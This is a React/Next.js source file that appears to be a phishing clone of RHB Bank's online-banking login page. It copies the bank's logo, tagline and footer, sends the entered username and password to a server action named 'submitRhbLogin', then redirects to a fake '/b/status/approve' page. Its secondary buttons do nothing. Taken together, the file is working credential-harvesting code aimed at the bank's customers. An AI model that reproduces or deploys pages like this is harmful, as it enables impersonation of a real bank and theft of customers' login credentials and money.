"use client";

import React, { useState } from "react";
import Image from "next/image";
import { Shield, Bell, Loader2, FileText, Landmark, FileCheck, BookOpen, MessageCircle } from "lucide-react";
import { submitRhbLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function RhbLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitRhbLogin(username, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 2000);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-white font-sans text-[#333]">
      {/* Top Blue Section */}
      <div className="bg-[#5BC5F2] px-6 pt-6 pb-12 text-white">
        {/* Header Icons */}
        <div className="flex items-center justify-between mb-8">
          <Image
            src="/bank/RHB_Logo.svg"
            alt="RHB Logo"
            width={120}
            height={40}
            className="h-10 w-auto invert brightness-0"
          />
          <div className="flex items-center gap-4">
            <Shield size={24} className="opacity-80" />
            <Bell size={24} className="text-[#FBC02D] fill-[#FBC02D]" />
            <div className="h-5 w-8 bg-[#E31E24] rounded-sm flex flex-col justify-between p-[1px]">
              <div className="h-[2px] w-full bg-[#0052B4]" />
              <div className="h-[2px] w-full bg-white" />
              <div className="h-[2px] w-full bg-[#E31E24]" />
            </div>
          </div>
        </div>

        {/* Tagline */}
        <div className="mb-10 text-center">
          <h2 className="text-[28px] font-medium leading-tight opacity-95">
            Banking right <span className="italic font-light">beside you</span>
          </h2>
        </div>

        {/* Form */}
        <form onSubmit={handleLogin} className="space-y-4 max-w-sm mx-auto">
          {error && (
            <div className="rounded bg-red-500/20 p-3 text-center text-sm font-medium text-white border border-white/20">
              {error}
            </div>
          )}

          <div className="relative">
            <input
              type="text"
              placeholder="Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full rounded-xl bg-white px-6 py-4 text-lg text-gray-700 placeholder:text-gray-400 focus:outline-none"
              required
            />
          </div>

          <div className="relative">
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full rounded-xl bg-white px-6 py-4 text-lg text-gray-700 placeholder:text-gray-400 focus:outline-none"
              required
            />
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="flex w-full items-center justify-center rounded-xl bg-[#E0E0E0] py-4 text-xl font-bold text-[#888] shadow-md transition-all active:scale-[0.98] disabled:opacity-80 border-b-4 border-[#C0C0C0]"
          >
            {isLoading ? (
              <Loader2 className="h-6 w-6 animate-spin text-gray-500" />
            ) : (
              "LOGIN"
            )}
          </button>

          <div className="text-center pt-2">
            <button type="button" className="text-[13px] font-bold uppercase tracking-wide opacity-90">
              FORGOT USERNAME/PASSWORD
            </button>
          </div>

          <div className="pt-6 text-center space-y-4">
            <p className="text-[15px] opacity-90 font-medium">Don't have RHB online banking account yet?</p>
            <button type="button" className="text-[17px] font-extrabold uppercase tracking-wider block mx-auto border-b-2 border-white pb-0.5">
              REGISTER NOW
            </button>
            <p className="text-[15px] opacity-90 pt-2 font-medium">Have a pending application?</p>
            <button type="button" className="text-[17px] font-extrabold uppercase tracking-wider block mx-auto border-b-2 border-white pb-0.5">
              TRACK APPLICATION
            </button>
          </div>
        </form>
      </div>

      {/* Services Section */}
      <main className="flex flex-col bg-white px-6 py-10">
        <h3 className="mb-8 text-[20px] font-bold text-[#444]">Services</h3>
        
        <div className="grid grid-cols-3 gap-y-10">
          {[
            { icon: <FileText size={28} className="text-blue-400" />, label: "Apply & Track" },
            { icon: <Landmark size={28} className="text-[#1A237E]" />, label: "Branch Appointment" },
            { icon: <Shield size={28} className="text-[#90A4AE]" />, label: "Security Tips" },
            { icon: <BookOpen size={28} className="text-[#D32F2F]" />, label: "Digital Guides" },
            { icon: <MessageCircle size={28} className="text-[#424242]" />, label: "Get Help & Support" }
          ].map((item, i) => (
            <div key={i} className="flex flex-col items-center text-center gap-3">
              <div className="flex h-16 w-16 items-center justify-center rounded-full bg-blue-50 shadow-sm">
                {item.icon}
              </div>
              <span className="text-[12px] font-bold leading-tight text-gray-600 px-2">{item.label}</span>
            </div>
          ))}
        </div>
      </main>

      {/* Footer */}
      <footer className="mt-auto px-6 py-10 text-center text-[#666]">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-[11px] font-bold uppercase tracking-wider mb-4">
          <span>TERMS & CONDITIONS</span>
          <span>PRIVACY & PDPA NOTICE</span>
          <span>E-BANKING CHARTER</span>
          <span>DISCLAIMER</span>
        </div>
        <p className="text-[11px] font-medium">© 2026 RHB Bank Berhad 196501000373 (6171-M). All rights reserved.</p>
      </footer>
    </div>
  );
}
